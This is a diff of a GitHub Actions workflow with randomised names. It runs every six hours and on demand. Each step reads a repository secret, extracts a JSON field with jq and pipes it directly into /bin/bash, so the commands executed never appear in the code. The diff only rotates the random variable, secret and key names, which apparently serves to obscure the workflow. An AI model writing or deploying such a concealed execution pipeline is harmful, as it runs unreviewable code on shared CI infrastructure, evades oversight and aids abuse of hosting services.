@@ -1,25 +1,23 @@
 name: immodestunguarded
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 5/6 * * *'
-jobs:  # 2265
+    - cron: '23 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: immodestunguarded
         env:
-          qxpgg63224: ${{ secrets.qxpgg63224 }}
+          xzifx85015: ${{ secrets.xzifx85015 }}
         run: |
-          echo $qxpgg63224 | jq -r .shlvu531 | /bin/bash
-          echo $yjj87 | jq -r .zrm21247 | /bin/bash
-          echo $ifrex24514 | jq -r .st57 | /bin/bash
-          echo $puobq0310 | jq -r .zylu26040 | /bin/bash
-          echo $tfhzw25 | jq -r .v33874 | /bin/bash
-          echo $jlev38 | jq -r .uf91448 | /bin/bash
-          echo $t2999 | jq -r .nklmv5282 | /bin/bash
-          echo $n133 | jq -r .d37192 | /bin/bash
-          echo $xai493 | jq -r .rkkl1 | /bin/bash
+          echo $xzifx85015 | jq -r .uhjg68 | /bin/bash
+          echo $gyti47 | jq -r .vg9 | /bin/bash
+          echo $oiuh0 | jq -r .fu2886 | /bin/bash
+          echo $fkf90732 | jq -r .ucft69 | /bin/bash
+          echo $smwc124 | jq -r .twun14 | /bin/bash
+          echo $wgdit143 | jq -r .p5886 | /bin/bash
+          echo $fa1967 | jq -r .sw9100 | /bin/bash
 
